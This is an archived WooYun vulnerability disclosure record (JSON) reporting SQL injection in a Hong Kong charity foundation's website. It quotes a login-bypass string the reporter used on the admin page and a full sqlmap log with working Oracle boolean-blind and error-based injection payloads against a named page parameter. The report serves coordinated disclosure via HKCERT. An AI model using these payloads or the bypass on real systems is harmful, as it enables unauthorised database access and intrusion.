{"id": 80920, "wybug_id": "wooyun-2015-0154859", "wybug_title": "香港爱心基金会存在SQL注入（香港地區）", "wybug_corp": "www.lovetv.hk", "wybug_author": "illl", "wybug_date": "2015-11-26 12:52", "wybug_open_date": "2016-01-14 15:06", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(hkcert香港互联网应急协调中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["管理后台对外", "字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-14：\t细节向公众公开  简要描述：  详细说明：  用google找到了香港爱心基金会的后台url：http://**.**.**.**/admin/login.aspx   用万能密码成功登陆 \nadmin' or 'a'='a\n\n\n\n\n  放到sqlmap去跑\n\n   看不懂。。。 \nMicrosoft Windows [版本 10.0.10240](c) 2015 Microsoft Corporation. All rights reserved.E:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Python 2.7\\sqlmap-master>sqlmap.py -u http://www.******.hk/shownews.asp?id=2007         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20151112}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://**.**.**.**[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 20:43:59[20:44:00] [INFO] testing connection to the target URL[20:44:00] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS[20:44:01] [INFO] testing if the target URL is stable[20:44:01] [INFO] target URL is stable[20:44:01] [INFO] testing if GET parameter 'id' is dynamic[20:44:02] [INFO] confirming that GET parameter 'id' is dynamic[20:44:02] [INFO] GET parameter 'id' is dynamic[20:44:02] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'Oracle')[20:44:02] [INFO] testing for SQL injection on GET parameter 'id'it looks like the back-end DBMS is 'Oracle'. Do you want to skip test payloads specific for other DBMSes? [Y/n] yfor the remaining tests, do you want to include all tests for 'Oracle' extending provided level (1) and risk (1) values? [Y/n] y[20:46:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[20:46:12] [INFO] GET parameter 'id' seems to be 'AND boolean-based blind - WHERE or HAVING clause' injectable[20:46:12] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[20:46:36] [INFO] GET parameter 'id' is 'Oracle AND error-based - WHERE or HAVING clause (XMLType)' injectable[20:46:36] [INFO] testing 'Oracle inline queries'[20:46:36] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'[20:46:36] [WARNING] time-based comparison requires larger statistical model, please wait..................[20:46:40] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)[20:46:40] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)'[20:46:40] [INFO] testing 'Oracle stacked queries (heavy query - comment)'[20:46:40] [INFO] testing 'Oracle stacked queries (heavy query)'[20:46:40] [INFO] testing 'Oracle stacked queries (DBMS_LOCK.SLEEP - comment)'[20:46:41] [INFO] testing 'Oracle stacked queries (DBMS_LOCK.SLEEP)'[20:46:41] [INFO] testing 'Oracle stacked queries (USER_LOCK.SLEEP - comment)'[20:46:41] [INFO] testing 'Oracle stacked queries (USER_LOCK.SLEEP)'[20:46:41] [INFO] testing 'Oracle AND time-based blind'[20:46:43] [INFO] testing 'Oracle OR time-based blind'[20:46:43] [INFO] testing 'Oracle AND time-based blind (comment)'[20:46:43] [INFO] testing 'Oracle OR time-based blind (comment)'[20:46:43] [INFO] testing 'Oracle AND time-based blind (heavy query)'[20:46:45] [INFO] testing 'Oracle OR time-based blind (heavy query)'[20:46:47] [INFO] testing 'Oracle AND time-based blind (heavy query - comment)'[20:46:47] [INFO] testing 'Oracle OR time-based blind (heavy query - comment)'[20:46:48] [INFO] testing 'Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)'[20:46:48] [INFO] testing 'Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)'[20:46:48] [INFO] testing 'Oracle time-based blind - Parameter replace (heavy queries)'[20:46:49] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[20:46:49] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[20:46:49] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test[20:46:51] [INFO] target URL appears to have 9 columns in queryinjection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y[20:48:03] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection point(s) with a total of 123 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=2007 AND 4552=4552    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: id=2007 AND 3212=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (3212=3212) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(120)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL)---[20:49:24] [INFO] the back-end DBMS is Oracleweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Oracle[20:49:24] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 87 times[20:49:24] [INFO] fetched data logged to text files under 'E:\\Users\\****\\.sqlmap\\output\\www.******.hk'[*] shutting down at 20:49:24E:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Python 2.7\\sqlmap-master>\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 illl@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-11-30 15:05 厂商回复： Referred to related parties. 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-11-28 20:28 |    \t\tilll \t\t\t( 实习白帽子  |\t\t\t        Rank:46 漏洞数:16        | 轻吟一句情话，执笔一副情画。绽放一地情...)\t\t \n  @hkcert香港互联网应急协调中心 希望两个洞一起能给14rank 让我摆脱路人身份 谢谢    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}